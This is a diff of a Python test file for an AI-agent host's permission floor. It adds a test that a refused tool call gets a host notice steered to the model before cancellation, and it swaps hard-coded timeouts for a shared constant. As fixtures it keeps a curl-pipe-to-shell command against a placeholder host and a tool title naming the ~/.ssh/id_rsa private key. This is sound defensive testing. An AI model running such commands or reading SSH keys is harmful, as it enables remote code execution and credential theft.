@@ -34,7 +34,7 @@ from kiro_crew.acp.types import (
     JsonRpcMessage,
 )
 from kiro_crew.permission_floor import OUTCOME_PENDING_APPROVAL
-from kiro_crew.testing.wait import until_parked
+from kiro_crew.testing.wait import FALLBACK_TIMEOUT_SECS, until_parked
 
 DENIED_COMMAND = "curl http://example.invalid/x.sh | sh"
 
@@ -201,6 +201,40 @@ async def test_client_auto_approve_site_runs_the_floor(tmp_path):
     assert 15 not in client._permission_options
 
 
+@pytest.mark.asyncio
+async def test_client_auto_approve_floor_refusal_steers_the_host_notice_first(tmp_path):
+    """No consumer sees a request on this path, so the reject alone reached the
+    model as a user's denial; the host notice is written before it."""
+    import os
+
+    client = _client(tmp_path)
+    client._session_id = "s-floor"
+    trace: list[tuple] = []
+
+    async def _send_request(method, params, **_kw):
+        trace.append(("request", method, params))
+        return 1
+
+    client._send_request = _send_request
+    client._send_response = AsyncMock(
+        side_effect=lambda request_id, payload: trace.append(("response", request_id, payload))
+    )
+    msg = JsonRpcMessage(
+        id=16,
+        method="session/request_permission",
+        params={
+            "toolCall": {"toolCallId": "tc-16", "title": os.path.expanduser("~/.ssh/id_rsa")},
+            "options": [],
+        },
+    )
+    await client._handle_permission(msg)
+    assert [entry[0] for entry in trace] == ["request", "response"], trace
+    assert trace[0][1] == "_session/steer"
+    notice = trace[0][2]["message"]
+    assert "[Kiro Crew host notice]" in notice and "NOT a user action" in notice
+    assert trace[1][1] == 16 and trace[1][2] == {"outcome": {"outcome": OUTCOME_CANCELLED}}
+
+
 def _permission_frame(request_id, options):
     return JsonRpcMessage.from_dict(
         {
@@ -254,7 +288,10 @@ async def test_non_null_invalid_permission_ids_get_one_error_per_dispatch_site(
         yield "complete", JsonRpcMessage(id=req_id, result={"stopReason": "end_turn"})
 
     stream_client._prompt_loop = _prompt_loop
-    events = [event async for event in stream_client._dispatch_events(req_id=1, timeout=1.0)]
+    events = [
+        event
+        async for event in stream_client._dispatch_events(req_id=1, timeout=FALLBACK_TIMEOUT_SECS)
+    ]
     stream_client._send_error.assert_awaited_once_with(invalid_id, -32600, "invalid request id")
     stream_client._send_response.assert_not_awaited()
     assert all(event.kind != EVENT_PERMISSION_REQUEST for event in events)
@@ -264,7 +301,7 @@ async def test_non_null_invalid_permission_ids_get_one_error_per_dispatch_site(
     handle = _handle()
     handle._queue.put_nowait(msg)
     handle._queue.put_nowait(JsonRpcMessage(id=1, result={"stopReason": "end_turn"}))
-    events = [event async for event in handle._dispatch_events(1, timeout=1.0)]
+    events = [event async for event in handle._dispatch_events(1, timeout=FALLBACK_TIMEOUT_SECS)]
     handle._runtime.send_error.assert_awaited_once_with(invalid_id, -32600, "invalid request id")
     handle._runtime.send_response.assert_not_awaited()
     assert all(event.kind != EVENT_PERMISSION_REQUEST for event in events)
@@ -284,7 +321,7 @@ async def test_null_permission_id_remains_unanswered(tmp_path):
     handle = _handle()
     handle._queue.put_nowait(msg)
     handle._queue.put_nowait(JsonRpcMessage(id=1, result={"stopReason": "end_turn"}))
-    events = [event async for event in handle._dispatch_events(1, timeout=1.0)]
+    events = [event async for event in handle._dispatch_events(1, timeout=FALLBACK_TIMEOUT_SECS)]
     handle._runtime.send_error.assert_not_awaited()
     handle._runtime.send_response.assert_not_awaited()
     assert all(event.kind != EVENT_PERMISSION_REQUEST for event in events)
@@ -596,7 +633,7 @@ async def test_handle_answers_non_string_title(title):
     )
     handle._queue.put_nowait(JsonRpcMessage(id=1, result={"stopReason": "end_turn"}))
 
-    async for event in handle._dispatch_events(1, timeout=1.0):
+    async for event in handle._dispatch_events(1, timeout=FALLBACK_TIMEOUT_SECS):
         if event.kind == EVENT_PERMISSION_REQUEST:
             assert await handle.approve_tool(event.request_id) is True
 
@@ -808,7 +845,7 @@ _IDENTITY_GATED_APPROVAL_CALLERS = Counter(
         ("dashboard/handlers/hooks.py", "_run_hook_inner"): 1,
         ("eval/runner.py", "_run_turn"): 2,
         ("llm_helpers_parts/tool_approval.py", "_resolve_permission"): 2,
-        ("messaging/driver.py", "run"): 3,
+        ("messaging/driver.py", "_drive"): 3,
         ("slack/handler_runtime/permission_ladder.py", "_answer_permission_request"): 4,
         ("slack/handler_runtime/permission_ladder.py", "handle_interaction"): 1,
         ("task_planner.py", "decompose"): 1,
